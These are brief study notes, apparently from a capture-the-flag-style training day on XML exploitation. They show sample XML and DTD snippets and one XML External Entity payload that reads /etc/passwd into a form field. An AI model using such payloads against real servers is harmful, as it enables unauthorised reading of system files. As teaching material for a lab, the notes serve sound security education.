# Notes for Day5

## Theme: **XML Exploitation**

## Links

- [Burp Suite](https://portswigger.net/burp/communitydownload)
- [XXE Room](https://tryhackme.com/r/room/xxeinjection)

## General

- Extensible Markup Language (XML) example:

```xml
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

- Document Type Definition (DTD) example:

```html
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
```

- Example XML External Entity (XXE) vulnerability:

```xml
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```
